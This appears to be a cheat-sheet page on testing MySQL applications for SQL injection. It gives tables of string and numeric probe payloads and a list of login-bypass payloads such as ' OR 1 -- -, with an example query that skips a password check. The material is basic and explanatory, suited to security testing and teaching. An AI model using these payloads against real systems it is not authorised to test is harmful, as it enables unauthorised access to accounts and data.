---
title: Testing Injection
description: Techniques for testing SQL injection vulnerabilities in MySQL
category: Basics
order: 2
tags: ["testing", "basics", "injection"]
lastUpdated: 2025-03-16
---

When testing for SQL injection vulnerabilities in MySQL databases, keep in mind:

- False means the query is invalid (MySQL errors/missing content on website)
- True means the query is valid (content is displayed as usual)

## String-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = '1';
```

| Test Payload | Result | Description                          |
| ------------ | ------ | ------------------------------------ |
| `'`          | False  | Single quote breaks the syntax       |
| `''`         | True   | Two quotes balance each other        |
| `"`          | False  | Double quote breaks the syntax       |
| `""`         | True   | Two double quotes balance each other |
| `\`          | False  | Backslash breaks the syntax          |
| `\\`         | True   | Two backslashes balance each other   |

### Examples

```sql
SELECT * FROM Articles WHERE id = '1''';
```

```sql
SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
```

### Notes

- You can use as many apostrophes and quotations as you want as long as they pair up
- It is also possible to continue the statement after the chain of quotes
- Quotes escape quotes

## Numeric-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = 1;
```

| Test Payload | Result | Description                            |
| ------------ | ------ | -------------------------------------- |
| `AND 1`      | True   | Logical truth maintains query validity |
| `AND 0`      | False  | Logical false invalidates the query    |
| `AND true`   | True   | Logical truth maintains query validity |
| `AND false`  | False  | Logical false invalidates the query    |
| `1-false`    | -      | Returns 1 if vulnerable                |
| `1-true`     | -      | Returns 0 if vulnerable                |
| `1*56`       | -      | Returns 56 if vulnerable, 1 if not     |

### Example

```sql
SELECT * FROM Users WHERE id = 3-2;
```

### Notes

- `true` is equal to 1
- `false` is equal to 0

## Login Bypass Techniques

Given the query:

```sql
SELECT * FROM Table WHERE username = '';
```

| Test Payload      |
| ----------------- |
| `' OR '1`         |
| `' OR 1 -- -`     |
| `" OR "" = "`     |
| `" OR 1 = 1 -- -` |
| `'='`             |
| `'LIKE'`          |
| `'=0--+`          |

### Example

```sql
SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';
```
